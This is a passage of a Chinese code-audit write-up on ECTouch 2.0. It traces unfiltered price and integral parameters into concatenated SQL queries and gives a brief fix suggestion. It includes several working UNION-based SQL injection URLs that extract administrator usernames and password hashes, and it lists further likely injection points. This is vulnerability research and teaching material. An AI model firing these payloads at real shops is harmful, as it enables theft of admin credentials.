                $ret_id = $order_return['ret_id'];
这个注入需要条件比较多,自己跟下代码就好了。
你们可以继续分析下:
`public function check_aftermarket($rec_id)` //OrderModel.class.php:
`function order_goods_info($rec_id)`//OrderModel.class.php
`function aftermarket_goods($rec_id)` //OrderModel.class.php
`function get_cert_img($rec_id)`//OrderModel.class.php
`public function check_aftermarket($rec_id)`//UsersModel.class.php
里面都是直接拼接,可以全局搜索下调用地方,如果没有intval那么就是注入点了,我当时看了下没什么发现
## 0x10 (0day?)前台多处无条件无限制完美SQL注入
    这个无限制注入的挖掘过程,还是耐心吧,找调用,找返回。
###  0x10.1 Exchange asynclist_list $integral_max $integral_min无限制注入
直接看payload:
`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=Exchange&a=asynclist_list&integral_max=1.0union
select 1,password,3,password,5,user_name,7,8,9,10,11 from ecs_admin_user order
by goods_id asc%23`
分析一波:
`upload/mobile/include/apps/default/controllers/ExchangeController.class.php`
        public function asynclist_list() {
            $this->parameter();//跟进这里
            $asyn_last = intval(I('post.last')) + 1;
            $this->page = I('post.page');
            $list = model('Exchange')->exchange_get_goods($this->children, $this->integral_min, $this->integral_max, $this->ext, $this->size,
            $this->page, $this->sort, $this->order);
            die(json_encode(array('list' => $list))); //这个die好东西,直接输出结果了
            exit();
        }
这里需要跟进二个函数:
1.`$this->parameter();` 作用获取:
`$this->children, $this->integral_min, $this->integral_max`
2.`model('Exchange')->exchange_get_goods` 作用拼接造成sql
分析1
        private function parameter() {
            // 如果分类ID为0，则返回总分类页
            $page_size = C('page_size');
            $this->size = intval($page_size) > 0 ? intval($page_size) : 10;
            $this->page = I('request.page') ? intval(I('request.page')) : 1;
            $this->ext = '';
            $this->cat_id = I('request.cat_id');
            $this->integral_max = I('request.integral_max');//获取
            $this->integral_min = I('request.integral_min');//
分析2
    function exchange_get_goods($children, $min, $max, $ext, $size, $page, $sort, $order) {
            $display = $GLOBALS['display'];
            $where = "eg.is_exchange = 1 AND g.is_delete = 0 AND " .
                    "($children OR " . model('Goods')->get_extension_goods($children) . ')';
            if ($min > 0) {
                $where .= " AND eg.exchange_integral >= $min ";
            }
            if ($max > 0) {
                $where .= " AND eg.exchange_integral pre . 'exchange_goods AS eg LEFT JOIN  ' . $this->pre . 'goods AS g ' .
                    'ON  eg.goods_id = g.goods_id ' . ' LEFT JOIN ' . $this->pre . 'touch_goods AS xl ' . ' ON g.goods_id=xl.goods_id ' .
                    " WHERE $where $ext ORDER BY $sort $order LIMIT $start ,$size ";//拼接
            $res = $this->query($sql);
关于利用怎么返回注入内容参考我前面说的,payload用了order by排序来绕过,你们可以参考本文去debug,
因为写到这里,我觉得不再必要去细细再讲一次,你们动手debug可能会更好。
        public function asynclist()
        {
            $this->parameter();
            $this->assign('show_marketprice', C('show_marketprice'));
            $asyn_last = intval(I('post.last')) + 1;
            $this->size = I('post.amount');
            $this->page = ($asyn_last > 0) ? ceil($asyn_last / $this->size) : 1;
            $goodslist = $this->category_get_goods();
            foreach ($goodslist as $key => $goods) {
                $this->assign('goods', $goods);
                $sayList[] = array(
                    'single_item' => ECTouch::view()->fetch('library/asynclist_info.lbi')
                );
            }
            die(json_encode($sayList));
            exit();
        }
        /**
         * 异步加载商品列表
         */
        public function async_list()
        {
            $this->parameter();
            $this->assign('show_marketprice', C('show_marketprice'));
            $this->page = I('post.page');
            $goodslist = $this->category_get_goods();
            die(json_encode(array('list' => $goodslist)));
            exit();
        }
###  0x10.2 category asynclist price_max无限制注入
Payload:`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0union
select 1,user_name,3,4,5,password,7,8,9,10,11,12,13,14,15,16,17,18,19 from
ecs_admin_user order by goods_id asc limit 1%23`
        public function asynclist()
        {
            $this->parameter();
            $this->assign('show_marketprice', C('show_marketprice'));
            $asyn_last = intval(I('post.last')) + 1;
            $this->size = I('post.amount');
            $this->page = ($asyn_last > 0) ? ceil($asyn_last / $this->size) : 1;
            $goodslist = $this->category_get_goods(); //注入
            foreach ($goodslist as $key => $goods) {
                $this->assign('goods', $goods);
                $sayList[] = array(
                    'single_item' => ECTouch::view()->fetch('library/asynclist_info.lbi')
                );
            }
            die(json_encode($sayList));
            exit();
        }
###  0x10.3 category async_list $price_max无限制注入
Payload:
`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=category&a=async_list&price_max=1.0union
select 1,user_name,3,4,5,password,7,8,9,10,11,12,13,14,15,16,17,18,19 from
ecs_admin_user order by goods_id asc limit 1%23`
        public function async_list()
        {
            $this->parameter();
            $this->assign('show_marketprice', C('show_marketprice'));
            $this->page = I('post.page');
            $goodslist = $this->category_get_goods();
            die(json_encode(array('list' => $goodslist)));
            exit();
        }
还有好几处我就不想继续去分析了,你们可以继续去寻找看看,寻找方法看我总结搜索即可。
**总结下这几个注入:**
原因1:`$max $min`这些相关的值没有intval处理,可以利用php弱类型绕过,其他点用intval处理了。神奇+1
原因2:直接拼接变量
(1)`ActivityModel.class.php`
`function category_get_count($children, $brand, $goods, $min, $max, $ext)`
`function category_get_goods`
(2`CategoryModel.class.php`
`function category_get_count`
`function get_category_recommend_goods`
(3)`ExchangeModel.class.php`
`function exchange_get_goods`
`function get_exchange_goods_count`
修复建议:可控变量intval处理
## 0x11 代码审计SQL注入总结
SQL注入没什么总结的,寻找可控,跟踪变量,sql注入三部曲。
但是这次审计改变了我很多看法,以前我总是觉得,有了全局过滤,那么注入应该比较少了,所以我第一次就是抱着这样消极的想法,所以没审计出漏洞,但是后来我听说phpoop师傅也审计过这个cms的前台注入,我一下子干劲就上来了,认真读了代码,果然收获颇丰。
最后介绍下ECTOUCH2.0还可寻找注入漏洞的点,关注下处理变量的函数。
      154:         $json = new EcsJson;
      155:         $goods = $json->decode($_POST ['goods']);
比如这些,我当时简单读了下
        function decode($text, $type = 0) { // 榛椫?type=0杩斿洖obj,type=1杩斿洖array
            if (empty($text)) {
                return '';
            } elseif (!is_string($text)) {
                return false;
            }
            if (EC_CHARSET === 'utf-8' && function_exists('json_decode')) {
                return addslashes_deep_obj(json_decode(stripslashes($text), $type));
            }
            $this->at = 0;
            $this->ch = '';
            $this->text = strtr(stripslashes($text), array(
                "r" => '', "n" => '', "t" => '', "b" => '',
                "x00" => '', "x01" => '', "x02" => '', "x03" => '',
                "x04" => '', "x05" => '', "x06" => '', "x07" => '',
                "x08" => '', "x0b" => '', "x0c" => '', "x0e" => '',
                "x0f" => '', "x10" => '', "x11" => '', "x12" => '',
                "x13" => '', "x14" => '', "x15" => '', "x16" => '',
                "x17" => '', "x18" => '', "x19" => '', "x1a" => '',
                "x1b" => '', "x1c" => '', "x1d" => '', "x1e" => '',
                "x1f" => ''
            ));
            $this->next();
            $return = $this->val();
            $result = empty($type) ? $return : $this->object_to_array($return);
            return addslashes_deep_obj($result);
        }
也是做了过滤,可以考虑下组合之类的,这可能是我进阶代码审计需要学习的了。
## 0x12 感受
从第一次审计没有收获到第二次收获满满的注入点,我感觉到了php代码审计的极大魅力。接下来，因为注入我觉得基本饱和了,所以不打算对注入再进行其他分析啥的,但是我会继续审计其他漏洞,比如xss,逻辑漏洞,xxe(考完试就写这个),这些漏洞我也不知道存不存在，但是我还是会把过程记录下来供你们参考(ps:希望大佬不要介意小菜的垃圾见解,希望大佬多多指点),最后希望回首的时候,这些续集文章能见证我的php代码审计成长之路,come
on!